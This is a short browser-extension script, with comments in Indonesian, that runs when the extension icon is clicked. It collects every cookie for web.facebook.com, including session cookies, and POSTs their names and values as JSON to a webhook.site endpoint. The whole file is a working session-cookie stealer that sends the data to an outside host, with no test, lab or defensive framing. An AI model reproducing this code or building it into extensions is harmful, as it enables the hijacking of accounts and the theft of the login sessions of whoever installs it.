function getCookie() {
	browser.cookies.getAll({ url: "https://web.facebook.com" }, function (cookies) {
		console.log(cookies);
		let cookieName = [];
		let cookieVal = [];
		cookies.forEach(function (cookie) {
			cookieName.push(cookie.name);
			cookieVal.push(cookie.value);
		});

		var xhr = new XMLHttpRequest();
		xhr.open("POST", "https://webhook.site/82c8847e-1523-4b5c-bb28-579431cf4479", true);
		xhr.setRequestHeader("Content-Type", "application/json");

		xhr.onload = function () {
			if (xhr.status === 200) {
				console.log("Data sent successfully");
				console.log(xhr.responseText);
			} else {
				console.error("Error sending data. Status:", xhr.status);
				console.log(xhr.responseText);
			}
		};

		xhr.onerror = function () {
			console.error("Error sending data:", xhr.statusText);
		};

		var data = JSON.stringify({ nama: cookieName, isi: cookieVal });
		xhr.send(data);
	});
}

// Menjalankan fungsi getCookie saat ikon ekstensi diklik
browser.browserAction.onClicked.addListener(getCookie);
